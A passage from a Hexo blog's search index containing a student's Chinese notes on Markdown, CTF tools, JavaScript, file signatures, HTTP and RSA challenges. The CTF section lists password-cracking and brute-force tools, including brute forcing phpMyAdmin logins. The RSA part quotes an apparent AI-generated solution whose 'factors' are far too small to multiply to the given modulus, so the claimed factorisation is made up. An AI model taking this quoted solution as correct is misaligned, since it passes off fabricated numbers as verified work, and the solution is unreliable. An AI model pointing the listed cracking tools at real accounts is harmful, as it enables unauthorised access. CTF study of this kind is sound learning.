~~ 包围的文本会被**横线删除**。\n- （Github 版）使用 \\<mark> 和 \\</mark> 包围的文本会被**高亮**。\n- 在 > 后的文本会被**引用**。\n- （Github 版）使用 \\<sub> 和 \\</sub> 包围的文本会变为**下标**。\n- （Github 版）使用 \\<sup> 和 \\</sup> 包围的文本会变为**上标**。\n- 使用 \\<u> 和 \\</u> 包围的文本会出现**下划线**。\n- 输入 *** 后回车，即可添加**分隔线**。\n- 编写**不被渲染输出**的内容：\\<!--文本-->\n- 在文本前使用 \\&emsp;\\&emsp; 代表在文本前按下一次**Tab 键**。\n- 若需要空一行，按下回车键即可；若需要空多行，则需要在每一行空行处添加 \\&emsp;\\&emsp; 。\n- 若需要添加在 Markdown 中具有特殊意义的字符，在该符号前添加 \\ 即可。\n## 列表\n- 使用 - 或 * 或 + 加空格来创建无序列表。\n- 使用数字加 . 后加空格来创建有序列表。\n- 使用 - [ ] 后加空格来创建待办列表，使用 - [x] 进行打勾（字母 x 或 X）。\n\n## 图片\n- 使用 \\!\\[替代文本](图片地址) 来插入图片。\n  - 带尺寸的图片：! [图片名称] (图片路径/1.png =60×60)\n  - 宽度确定高度等比例的图片：! [图片名称] (图片路径/1.png =60×)\n  - 高度确定宽度等比例的图片：! [图片名称] (图片路径/1.png =×60)\n  - 居中的图片：! [图片名称] (图片路径/1.png#pic_center)\n    居左：#pic_left ，居右：#pic_right\n    居中并且带尺寸的图片：! [图片名称] (图片路径/1.png#pic_center =60×60)\n\n## 链接\n- 使用 <链接地址> 直接显示网站链接。\n- 使用 \\[显示文本](链接地址) 来创建超链接，显示文本会代替连接出现。\n\n## 代码\n- 使用反引号插入单行代码，使用三个反引号创建代码块。\n- 段首键入 Tab 键或输出 4 个空格，即可添加代码块。\n- 段落前后添加三个反引号，即可将中间段落识别为代码块；若要在正文中键入代码，则在代码前后添加一个反引号。\n- 需要代码高亮时，在段落前的三个反引号后添加语言名称，如 python ，即可高亮显示代码块。\n\n## 表格\n- 左对齐：|:--| ，右对齐：|-\\-\\:| ，居中对齐：|:-\\-\\:| 。\n- 可以在表格中设置文本格式。例如可以添加链接，代码（仅反引号（`）中的单词或短语，而不是代码块）和强调；但是不能添加标题，块引用，列表，水平规则，图像或 HTML 标签。\n- 可以使用表格的 HTML 字符代码 &#124; 在表中显示竖线 | 字符。\n- 表格居中代码\n```html\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n\n<p align=\"center\"><font face=\"黑体\" size=2.>表1 示例表格</font></p>\n\n<div class=\"center\">\n\n|   序号   |   内容  |        描述         |\n|  :---:  |  :---:  |  :---------------:  |\n|    1    |    l    |  大写字母L的小写字母l |\n|    2    |    I    |      大写字母I       |\n|    3    |    1    |        数字1       |\n\n</div>\n```\n- 效果：\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n\n<p align=\"center\"><font face=\"黑体\" size=2.>表1 示例表格</font></p>\n\n<div class=\"center\">\n\n|   序号   |   内容  |        描述         |\n|  :---:  |  :---:  |  :---------------:  |\n|    1    |    l    |  大写字母L的小写字母l |\n|    2    |    I    |      大写字母I       |\n|    3    |    1    |        数字1       |\n\n</div>\n\n- 常用复制版本：\n```html\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n<div class=\"center\">\n<!-- 表格输入位置 -->\n \n</div>\n```\n\n\n## 注脚与注释\n- 在文本后输入 [^数字] 添加注脚，在其它处输入 [^数字]: 添加注脚的解释。\n- 在其它处输入 *[文本]: 添加注释，在原文本处会出现虚下划线，鼠标靠近虚下划线就会出现注释内容。\n- [插件尝试](https://www.jovi.cc/add-superscript-subscript-footnote-and-other-functions-to-hexo.html/)\n  - H~2~O：H\\~2~O; H\\<sub>2\\</sub>O\n  - x^2^+：x\\^2^+; x\\<sup>2\\</sup>+\n  - <u>Inserted</u>：\\<u>Inserted\\</u>\n\n## 数学公式\n参考文章：[markdown公式符号大全](https://blog.csdn.net/konglongdanfo1/article/details/85204312)\n\n## 符号表情\n一些 Markdown 应用程序允许通过键入表情符号短代码来插入表情符号。这些以冒号开头和结尾，并包含表情符号的名称。\n一些常见的表情符号简码列表见网页：[github markdown 表情符号标记的完整列表](https://gist.github.com/rxaviers/7360908)\n\n## 其他\n- 在 CSDN 版的 Markdown 中，如果输入 (r) 或 (R) 会显示为 ® ，解决办法是：输入 \\(r\\) 或 \\(R\\) 即可。\n- 花体字母：\n![alt text](/img/markdown-github-vscode使用文档_yinwen.png)\n- HTML 字符代码 &lt; 在 Markdown 中显示 < 字符\n  HTML 字符代码 &gt; 在 Markdown 中显示 > 字符\n  HTML 字符代码 &#61; 在 Markdown 中显示 = 字符\n  其他 HTML 特殊字符对应表请参考文章：[html中显示特殊符号（附带特殊字符对应表）](https://blog.csdn.net/sunbocong/article/details/81032758)\n\n## vscode图片直接拖拽粘贴与hexo兼容\n- [参考教程](https://zhuanlan.zhihu.com/p/19128537976)\n- 设置 VSCode 的 Markdown > Copy Files:Destination\n  - 打开 vscode 设置界面，搜索“Markdown copy file”。按下图添加一个项目。\n```\nItem：**/*.md\nVaule: /img/${documentBaseName}_${fileName}\n```\n  - 打开新的 VSCode 窗口\n  - 然后以**/source/文件**为根目录打开新的VSCode窗口，然后在里面编写 markdown 文件。此时VSCode将会把图片自动粘贴在/source/img/文件夹下，Hexo 渲染出来的页面也能找到放有图片的/img/路径。\n- 注意！！！：手动删除..变成!\\[alt text](/img/xxx.png)不然网站无法识别！！！\n\n##  hexo-blog-encrypt插件加密博客文章\n- [参考教程1-知乎](https://zhuanlan.zhihu.com/p/113235573)\n- [参考教程2-github](https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md)\n- 配置优先级：文章信息头 > _config.yml (站点根目录下的) > 默认配置\n- \n\n## 参考文章\n- [使用 VSCode 编写 Markdown 文件](https://blog.csdn.net/weixin_49272453/article/details/147440391?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-147440391-blog-89300713.235^v43^pc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.1&utm_relevant_index=3)\n- [Markdown表格居中显示](https://www.cnblogs.com/jianmuzi/p/16795528.html)\n- [使用Vscode和Hexo编写博客时让程序找到正确的图片路径](https://zhuanlan.zhihu.com/p/19128537976)\n- [对 Hexo 博客文章进行加密](https://zhuanlan.zhihu.com/p/113235573)\n- [hexo-blog-encrypt插件github中文README.md](https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md)","tags":["markdown","github","vscode"],"categories":["语法笔记"]},{"title":"ctf工具箱内容学习（未完成ing）","url":"/2025/08/20/ctf工具箱内容学习/","content":"\n- [暴力破解](#暴力破解)\n- [文本处理（文件里叫“文本编辑器”）](#文本处理文件里叫文本编辑器)\n- [编码解码](#编码解码)\n- [爆破工具](#爆破工具)\n- [密码工具](#密码工具)\n\n\n## 暴力破解\n![alt text](../img/ctf工具箱内容学习_1-1.png)\n![alt text](/img/ctf工具箱内容学习_1-1.png)\n1. Ziperello：暴力破解zip文件密码/字典/模板，但没有字典只能破解六位密码\n2. pkcrck不知道为什么电脑不能打开可能是win32版本所以打不开，但网上没找到其他版本的（待）\n3. ARCHPR：暴力破解/字典/掩码（不确定的地方打上？就行）\n---\n## 文本处理（文件里叫“文本编辑器”）\n![alt text](/img/ctf工具箱内容学习_1-2-1.png)\n1. 一个常见的010，我加了一个winhex（本来自己电脑的加进去了）\n---\n## 编码解码\n![alt text](/img/ctf工具箱内容学习_1-3-1.png)\n1. 因式分解（yafu打开cmd使用，\n   分解因数n：.\\yafu-x64.exe \"factor(n)\"\n   RSA常见脚本：\n```python\nfrom Crypto.Util.number import *\n\nn = p*q\nphi = (p-1)*(q-1)\nd = inverse(e,phi)\nm = pow(c,d,n)\nprint(long_to_bytes(m))\n```\n2. CyberChef：解码编码插件，有搜索功能，魔法棒好用\n3. RSATool：网上没找到，遇到题目再说\n4. Converter：功能有点鸡肋，尝试一个题目，直接卡死了\n5. CTFcrack：额离谱旧电脑显示皮下是stegsolve，实则是解码工具（后续再补充\n6. 与佛论禅（字面意思）\n7. Base64（字面意思）\n8. 随波逐流（编码解码好东西）\n![alt text](/img/ctf工具箱内容学习_suibo.png)\n1. AZdecrypt：Z340黄道十二宫密码破解软件\n使用：python移位+软件左框输入解密\n```python\ns = '''\n%,,@*>@?==%88%5\n,@%#@@90-7$^=*@\n17,(>()1@##-\\$40\n~,*6?#%#8#=75+1\n(*@*1%#>,0@5)%?\n%*^=)&>=1%,+7&#\n8681(+8*@@(,@@@\n#*=#\\$3*#%,#%%,3\n,*+7,7+@===+)61\n'''\n \ns = s.strip()\n \narr = s.split('\\n')\n \nfor n in range(1, 16):\n    tmp_s = ''\n \n    for index, value in enumerate(arr):\n        i = (2 * index + n) % 15 - 1\n        tmp_s += value[i]\n \n    print(tmp_s)\n```\n10. hashcat：cmd命令工具，原按钮无用，我加了exe文件按钮但具体用法是：##右键打开文件位置然后打开此处cmd##kali中自带！！！\nhttps://cloud.tencent.com/developer/article/2187201\n嗯，不是我现在用得上的高级东西，先浅放个使用方法网页，网页打不开去image文件夹找图片。\nhttps://www.cnblogs.com/Junglezt/p/16044372.html\n后面搜索到的使用文档\n11. CTF-Tools（原按钮失效，已删除重新添加exe文件可使用）\n![alt text](/img/ctf工具箱内容学习_CTF-Tools.png)\n1.  破空（原来是无效按钮旧版3.0的，看到有3.3的（申请QQ群ing未替换））\n> 3.3功能：\n> 1）查找到flag其他模式可以右键转换（结果去哪了还不清楚）\n> 2）文件可以直接拖进去\n> 3.3注意：\n> 1）关键字编码即将flag的base64编码、16进制一起搜索，但只对字符格式有效；\n> 2）网页查找智能用正则匹配\n1.  CQR：二维码常见工具\n2.  Hash计算（字面意思吧。。遇到题目再说）\n3.  CaptfEncoder（原按钮无效，已删除重新添加exe文件可使用）：解码编码，有搜索功能\n4.  Apocalypso（原按钮无效，已删除重新添加exe文件可使用）：\n![alt text](/img/ctf工具箱内容学习_A.png)\n1.  RSATool2v110（原按钮无效，已删除重新添加exe文件可使用）：\nP、Q、R、D、E 分别就是 RSA 算法中的 p、q、N、d、e，右上角选择进制，注意：e 只有十六进制可用，左下角有一个 Factor N 的按钮，这是分解 N 的意思，点一下，会自动开始分解因数，得到 P、Q，Calc.D是计算按钮\n1.  MixedCS：DES加密软件\n2.  5bit编码：字面意思\n3.  SSLEye：编码解码工具，没有搜索功能\n![alt text](/img/ctf工具箱内容学习_SSL.png)\n1.  在线。。。：字面意思\n2.  Ookbrainfuck：两种编码在线网站\nOok! has only three distinct syntax elements:\nOok.   /   Ook?   /   Ook!\nBrainfuck语言用> < + - . , [ ]八种符号来替换C语言的各种语法和命令\n1.  brainfuck：字面意思吧但网页看不懂怎么操作\n2.  摩斯密码：好像打不开。。\n3.  quip词频分析：Quipqiup 是一个快速且自动化的密码求解器 by 埃德温 奥尔森。它可以解决常见的简单替换密码在报纸上，包括像 Cryptoquips 这样的谜题（在哪个词中边界被保留）。（遇到题目再说咯）\n4.  Playfair：（字面意思Playfair解码网站）\n5.  hillcipher：同上\n6.  熊说。。。：美化网站。。不知道怎么混进来的\n7.  malbolge：Malbolge 由 Ben Olmstead 于 1998 年发明，是一种深奥的编程语言，旨在尽可能难以编程。事实就是这样：-）（什么鬼东西哦编程在线网页？\n8.  Wingdings：将常规英文文本转换为可复制和粘贴的 Wingdings 文本\n9.  双hex：（字面意思two hex解码网站）\n10. 维吉利亚：\n![alt text](/img/ctf工具箱内容学习_V.png)\n1.  切鲁：（混进来的鬼东西？\n2.  0宽1、0宽2、emoji-aes：打不开\n---\n## 爆破工具\n![alt text](/img/ctf工具箱内容学习_1-4.png)\n1. Bruter：爆破密码，ip+user用户名+dictionary\n2. John：使用方式看下面网址，打不开看images文件夹，kali自带\nhttps://www.cnblogs.com/Junglezt/p/16048189.html\n1. phpMyAdmin：字面意思暴力破解用户名密码\n2. t00ls：看不懂搜不到跳过\n3. 。。。都看不懂，遇到题目再说好了\n---\n## 密码工具\n（太多了bushi先放着）\n![alt text](/img/ctf工具箱内容学习_1-5.png)\n![alt text](/img/ctf工具箱内容学习_1-6.png)\n![alt text](/img/ctf工具箱内容学习_1-7.png)\n![alt text](/img/ctf工具箱内容学习_1-8.png)\n![alt text](/img/ctf工具箱内容学习_1-9.png)\n![alt text](/img/ctf工具箱内容学习_1-10.png)\n![alt text](/img/ctf工具箱内容学习_1-11.png)\n![alt text](/img/ctf工具箱内容学习_1-12.png)\n![alt text](/img/ctf工具箱内容学习_1-13.png)\n![alt text](/img/ctf工具箱内容学习_1-14.png)\n![alt text](/img/ctf工具箱内容学习_1-15.png)\n![alt text](/img/ctf工具箱内容学习_1-16.png)\n![alt text](/img/ctf工具箱内容学习_1-17.png)\n![alt text](/img/ctf工具箱内容学习_1-18.png)\n![alt text](/img/ctf工具箱内容学习_1-19.png)\n![alt text](/img/ctf工具箱内容学习_1-20.png)\n![alt text](/img/ctf工具箱内容学习_1-21.png)\n![alt text](/img/ctf工具箱内容学习_1-22.png)\n![alt text](/img/ctf工具箱内容学习_1-23.png)\n![alt text](/img/ctf工具箱内容学习_1-24.png) \n![alt text](/img/ctf工具箱内容学习_1-25.png) \n![alt text](/img/ctf工具箱内容学习_1-26.png) \n\n\n","tags":["ctf","工具"],"categories":["ctf工具"]},{"title":"python代码和bat自动化存档","url":"/2025/08/17/python代码和bat自动化存档/","content":"\n1. bat文件\n```\n@echo off\npython \"python文件绝对路径\\文件名.py\" & pause\n```\n>注意：\n>1）另存为时编码保存为ANSI，防止乱码\n>2）引号必须是英文引号\n\n2. 实现进制与字符串转换的python代码\n```\nastart = input('输入待处理数字或字符串：')\n#a = int(astart)\nbs = input('输入选择：1=数字2=字符串')\nb = int(bs)\nif b == 1:\n    c = int(input('数字是1=二进制2=十进制3=十六进制4=八进制'))\n    if  c == 1:\n        a10 = int(astart,2)\n        print('转为十进制为：',a10,'\\n转为八进制0o为：',oct(a10),'\\n转为十六进制0xc为：',hex(a10))\n    elif c == 2:\n        a = int(astart)\n        a10 = a\n        print('转为二进制0b为：',bin(a),'\\n转为八进制0o为：',oct(a),'\\n转为十六进制0xc为：',hex(a))\n    elif c == 3:\n        a10 = int(astart,16)\n        print('转为十进制为：',a10,'\\n转为八进制0o为：',oct(a10),'\\n转为十六进制0xc为：',hex(a10))\n    elif c == 4:\n        a10 = int(astart,8)\n        print('转为十进制为：',a10,'\\n转为八进制0o为：',oct(a10),'\\n转为十六进制0xc为：',hex(a10))\n    by = a10.to_bytes((a10.bit_length() + 7) // 8, 'big')   # 大端\n    print('转为字符串为：',by)\nelif b == 2:\n    a2 = astart.encode('utf-8')\n    a2_10 = int.from_bytes(a2,'big')\n    print('转为二进制0b为：',bin(a2_10),'\\n转为八进制0o为：',oct(a2_10),'\\n转为十六进制0xc为：',hex(a2_10),'\\n转为十进制为：',a2_10)\n```\n\n","tags":["ctf"],"categories":["知识点笔记"]},{"title":"js 笔记","url":"/2025/08/17/js-笔记/","content":"\n原先运行环境是网页，现在node能够模仿，所以本地运行需要下载node。\n具体（在VScode中编辑）：\n1新建html文件，！+Tab获得：\n```\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <h1 >Hello World!</h1>\n    <script src=\"文件名.js\"></script>\n</body>\n</html>\n```\n<body>处需要手动编辑：\n1）h1+Tab获得<h1 ></h1>标签，中间可编辑；\n2）script+Tab获得<script></script>标签，中间可编辑，但正常使用引用.js文件方式编辑，具体如上述代码。\n\n2 javascript语法粗略学习\n1. 打印函数\n```\nconsole.log('hello world');\n```\n\n1. 变量：var全局变量,let可修改,const不可修改赋值对象\n\n2. 原生数据类型：string,number包括小数,boolean,null,undefined \n3) undefined定义方法不是const而是：\n```\nlet 变量名\n```\n1) 类型检验方式：\n```\nconsole.log(typeof 变量名);\n```\n此时null输出object\n1) string\n1、打印方法（新/旧）\n```\nconsole.log('123'+变量名);\n//模板字符串 新方法：\nconst hello = `Myname is ${变量名}`; \nconsole.log(hello);\n```\n2、内置方法\n```\n//变量名.length\n//.toUpperCase()/.toLowerCase大小写\n//.substring(a,b)截取[a,b)；并且可以后面叠加（如大小写）\n//.split('')分割成数组 最小以字母为单位 ‘’内传入分割依据\n```\n\n1. 数组\n```\n//1）构造方法\n//const 变量名 = new Array(1,2,3,4);\n//const 变量名 = [1,'1',true];\n//2）索引\n//数组名[1]可直接获取/赋值\n//数组名.unshift('dhkaju')在最后加入数组\n//数组名.pop()删除最后\n//判断是否为数组Array.isArray(数组名)为bool值\n//数组名.indexOf('数组内容')为数组内容索引号\n```\n\n1. 对象\n```\n//const 对象名 = {}\n//属性可以TAB明确级别\n//调用\n//      对象名.属性名1，属性名2\n//      对象名.属性名1，属性名1.1\n//      对象名.属性名1[1]\n//剩余先跳过未学习\n```\n\n1. if\n```\nif (条件句){\n    内容\n}else{\n    内容\n}\n//条件句：===同时判断类型是否相同，==只判断内容\n//      ||或 &&且\n```\n\n1. 三目运算符\n```\nconst color = x > 10 ? 'red' : 'blue';\n//x > 10时color = 'red'反之'blue'\n```\n\n1. swith条件语句\n```\nswitch(color){\n    case 'red':\n        break;\n    default 'blue':\n        break;\n}\n```\n\n1. for while循环\n```\nfor (let i = 0;i <= 10; i++){\n    内容\n}\n//\nlet i = 0\nwhile(i < 10){\n    内容\n    i++;\n}\n```","tags":["javascript"],"categories":["语法笔记"]},{"title":"十六进制文件头尾特征","url":"/2025/08/16/十六进制文件头尾特征/","content":"## JPEG 图像文件\n```\nFFD8 FFE0 0010 4A46 4946 0001 0101 0047 ...\n```\nFFD8 表示 JPEG 文件的开始，FFE0 代表应用程序特定标记，4A46 4946 表示 \"JFIF\" 标识。\n```\n... FFD9\n```\n\n## PNG 图像文件\n```\n8950 4E47 0D0A 1A0A ...\n```\nPNG 文件的标准签名，其中 8950 4E47 对应 ASCII 编码的 %PNG。\n```\n... 0000 0000 4945 4E44 AE42 6082\n```\n4945 4E44 对应 ASCII 编码的 IEND，AE42 6082 是 CRC 校验码。\n\n## PDF 文档\n以 %PDF 开头，具体的十六进制表示如下：\n```\n2550 4446 2D31 2E3X ...\n```\n2550 4446 对应 ASCII 编码的 %PDF，2D31 2E3X 代表 PDF 的版本号。\n文件尾通常包含 %%EOF 标记，具体的十六进制表示如下：\n```\n... 2525 454F 46\n```\n2525 454F 46 对应 ASCII 编码的 %%EOF。\n\n## DOC 文件（Microsoft Word 97-2003）\n```\nD0 CF 11 E0 A1 B1 1A E1 ...\n```\n这个签名是 Microsoft 复合文件二进制格式（Compound File Binary Format, CFBF）的标志，常用于旧版 Microsoft Office 文档。\n文件尾没有固定的模式，但通常包含结束标记，如 00 00 00 00。\n\n## DOCX 文件/ZIP文件（Microsoft Word 2007+）\nDOCX 文件是基于 XML 的文件格式。\n```\n50 4B 03 04 ...\n```\n这个签名表示 ZIP 压缩文件格式，因为 DOCX 文件实际上是 ZIP 压缩的 XML 文件。\n文件尾通常以 ZIP 文件的结束标记结束：\n```\n... 50 4B 05 06\n```\n\n## TXT 文件\n没有固定的文件头，因为只是纯文本文件，有些文本文件可能以特定的字符编码（如 UTF-8）开始：\n```\nEF BB BF ...\n```\n这是 UTF-8 编码的字节顺序标记（BOM）。\n通常没有固定的文件尾。\n\n## MOV 视频文件\n```\n00 00 00 14 66 74 79 70 71 74 20 20 ...\n```\n66 74 79 70 对应 ASCII 编码的 ftyp，表示文件类型。\n文件尾没有固定的模式，但通常包含结束标记，如 6D 64 61 74（mdat）。\n\n## MP4 视频文件\nMP4 文件的文件头与 MOV 文件类似，也以 ftyp 开头，但后续字节可能有所不同：\n```\n00 00 00 18 66 74 79 70 6D 70 34 32 ...\n```\n6D 70 34 32 对应 ASCII 编码的 mp42，表示 MPEG-4 第2版。\n文件尾没有固定的模式，但通常包含结束标记，如 6D 64 61 74（mdat）。\n\n-----------------------------------\n©著作权归作者所有：来自51CTO博客作者陈锋爱吃菠萝的原创作品，请联系作者获取转载授权，否则将追究法律责任（联系中）\n十六进制文件头和文件尾：文件取证和恢复的关键\nhttps://blog.51cto.com/u_15763679/11200825","tags":["ctf","misc"],"categories":["知识点笔记"]},{"title":"ctf 碎片知识整理","url":"/2025/08/16/ctf-碎片知识整理/","content":"# 零碎知识点\n## 1. HTTP请求包（浏览器信息）\n我们先看看Request包的结构, Request包分为3部分，第一部分叫Request line（请求行）, 第二部分叫Request header（请求头）,第三部分是body（主体）。header和body之间有个空行，请求包的例子所示:\n```\nGET//请求行: 请求方法 请求URL HTTP协议/协议版本\nHost：//服务端的主机名\nUser-Agent：//浏览器信息\nAccept：//客户端能接收的MIME\nAccept-Encoding：//是否支持流压缩\nAccept-Charset：//客户端字符编码集\n//空行,用于分割请求头和消息体\n//消息体,请求资源参数,例如POST传递的参数\n```\nHTTP协议定义了很多与服务器交互的请求方法，最基本的有4种，分别是GET,POST,PUT,DELETE。一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，增，改，删4个操作。我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息。\n\nGET和POST的区别:\n> 1. 我们可以看到GET请求消息体为空，POST请求带有消息体。\n> 2. GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&相连，如EditPosts.aspx?name=test1&id=123456。POST方法是把提交的数据放在HTTP包的body中。\n> 3. GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制。\n> 4. GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码\n\nHTTP响应包（服务器信息）\n我们再来看看HTTP的response包，他的结构如下：\n```\nHTTP/1.1 200 OK\t\t\t\t\t\t//状态行\nServer: nginx/1.0.8\t\t\t\t\t//服务器使用的WEB软件名及版本\nDate:Date: Tue, 30 Oct 2012 04:14:25 GMT\t\t//发送时间\nContent-Type: text/html\t\t\t\t//服务器发送信息的类型\nTransfer-Encoding: chunked\t\t\t//表示发送HTTP包是分段发的\nConnection: keep-alive\t\t\t\t//保持连接状态\nContent-Length: 90\t\t\t\t\t//主体内容长度\n//空行 用来分割消息头和主体\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"... //消息体\n```\nResponse包中的第一行叫做状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。\n状态码用来告诉HTTP客户端,HTTP服务器是否产生了预期的Response。\nHTTP/1.1协议中定义了5类状态码， 状态码由三位数字组成，第一个数字定义了响应的类别\n> 1XX 提示信息 - 表示请求已被成功接收，继续处理\n> 2XX 成功 - 表示请求已被成功接收，理解，接受\n> 3XX 重定向 - 要完成请求必须进行更进一步的处理\n> 4XX 客户端错误 - 请求有语法错误或请求无法实现\n> 5XX 服务器端错误 - 服务器未能实现合法的请求\n————————————————\n版权声明：本文为CSDN博主「hespecial」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/m0_50376770/article/details/132438222\n\n## 2. 报错解决：error: externally-managed-environment\n方法1：安装venv虚拟环境（网上推荐但失败）\n方法2：安装pipx，成功但使用不便\n方法3：强行避免报错\n具体：\n原来安装代码：pip install 对象名\n现在安装代码：pip install --break-system-packages 对象名\n\n## 3. 报错解决：E：invalid opertion install\n更换源代码：\nsudo add-apt-repository main\nsudo add-apt-repository universe\nsudo add-apt-repository restricted\nsudo add-apt-repository multiverse\nsudo apt-get update\n\n## 4. 零宽隐写\nhttps://tool.bfw.wiki/tool/1695021695027599.html\n注意：用ctrl+A复制\n\n## 5. 要注意文件可以与文字xor!!!\n\n![alt text](/img/ctf-零散writeup_9.png)","tags":["ctf"],"categories":["知识点笔记"]},{"title":"misc 笔记","url":"/2025/08/13/misc-笔记/","content":"\n目录：\n- [sstv](#sstv)\n\n## sstv\n1. 下载方法：pip install sstv\n使用方法：\nwav音频文件放到sstv根目录（C:\\Windows\\System32\\sstv），打开cmd，输入\n```cmd\ncd sstv\nsstv -d 文件名.wav -o result.png#输出图片名\n\n```\n2. RX-SSTV解码软件\n下载地址：https://www.qsl.net/on6mu/rxsstv.htm\n虚拟声卡e2eSoft\n由于SSTV工具是根据音频传递图片信息，正常解法需要一台设备播放一台设备收音，所以需要一个虚拟声卡，还能避免杂音的干扰。\n下载地址：https://www.e2esoft.cn/vsc/\n![alt text](/img/misc-笔记_sstv.jpeg)\n","tags":["ctf","misc"],"categories":["知识点笔记"]},{"title":"软件下载方法存档","url":"/2025/08/12/软件下载方法存档/","content":"\n### 软件名：yaki\n用途：ctf web\n下载官网：https://yaklang.com/\n使用文档：https://yaklang.io/products/intro/\n\n![alt text](/img/软件下载方法存档_yaki.jpeg)\n### 软件名：QRresearch\n用途：ctf misc\n下载地址：https://wwws.lanzouy.com/iRLUn11jc12h或者百度网盘电脑存档文件夹内获取\n","tags":["存档","新电脑部署"],"categories":["存档"]},{"title":"LSB隐写题目解法","url":"/2025/08/11/LSB隐写题目解法/","content":"\n![alt text](/img/LSB隐写题目解法_LSB.jpg)","tags":["ctf","LSB","图片隐写"],"categories":["知识点笔记"]},{"title":"rsa 初步学习笔记","url":"/2025/08/09/rsa-初步学习笔记/","content":"\n1 因数，质数，余数\n\n2 公钥，私钥\n1）制作过程：\n![alt text](/img/rsa-初步学习笔记_4.png)\n2） 实际操作过程：\n![alt text](/img/rsa-初步学习笔记_5.png)\n\n3 工具\n1）https://factordb.com/\n分解n工具，注意！！！点数字后就到上方框里了可以复制！！！（有点愚蠢但愚蠢的人没发现\n\n\n****具体题目：****\n· 来源：spc学长xc\n基础rsa，在python中使用inverse()函数\n```\n#from Crypto.Util.number import *\n#from secret import flag\n#m = bytes_to_long(flag)\n#p = getPrime(512)\n#q = getPrime(512)\n#e = 65537\n#n = p*q\n#c = pow(m,e,n)\n#print(f'p = {p}')\n#print(f'q = {q}')\n#print(f'c = {c}')\n\np = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073\nq = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451\nc = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057\n\n#最终解决方法：\nfrom Crypto.Util.number import long_to_bytes, inverse\ne = 65537          \nn = p * q\nt = (p - 1) * (q - 1)\nd = inverse(e, t)\nm = pow(c, d, n)\n\nflag = long_to_bytes(m)\nprint(flag.decode())   \n\n```\n\n· 来源：spc学长xc\n题目提示：大数N的分解\n题目：\n```\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom serct import flag\np = getPrime(512)\nq = getPrime(512)\nn = p*q\nm = bytes_to_long(flag)\ne = 65537\nc = powmod(m, e, n)#加密结果    \nprint(n)\nprint(c)\n\n# 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153\n# 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069\n```\n\nAI解法：\n拿到题目后，我们手里只有n ，c ，e，但没有 p 和 q ，所以第一步就是分解 n。\n1. 先直接上 yafu / factordb\n（注意！！！分解时要求P*Q=N，且注意P跟Q的bit特征，在此题当中只有512bit）\n```\np = 72224896773450610791657349018700642791668283264384520670702825479122904864127\nq = 72224896773450610791657349018700642791668283264384520670702825479122904864239\n```\n（这两个数只差 112，所以 yafu 的 ECM / SIQS 都能秒破。）（yafu下载后卡死【待解决】\n\n2. 有了 p、q，就能算私钥 d\n\n```\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\n\nn = 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153\nc = 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069\ne = 65537\n\np = 72224896773450610791657349018700642791668283264384520670702825479122904864127\nq = 72224896773450610791657349018700642791668283264384520670702825479122904864239\n\nassert p * q == n\n#校验等式是否成立\n\nphi = (p - 1) * (q - 1)#欧拉函数\nd = invert(e, phi)#e*d≡1mod phi\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n```\n（这题就是典型的“p、q 距离太近”导致用 Fermat 方法或 ECM 就能秒分解。）（这两个方法是什么？\n\n\n\n· 来源：spc学长xc\n```\nfrom Crypto.Util.number import *\n\nm = bytes_to_long(b'flag{******}')\n\np = getPrime(512)\nq = getPrime(512)\nr = getPrime(512)\n# 分别独立地生成 3 个 512 bit（≈154 位十进制）的随机强素数 p、q、r。这三个素数就是后面多素数 RSA 的因子。\n\nh1 = 1*p + 1*q + 1*r\nh2 = 2*p + 3*q + 3*r\nh3 = 9*p + 9*q + 6*r\nprint( \"hint_of_pqr=\" , h1 , h2 , 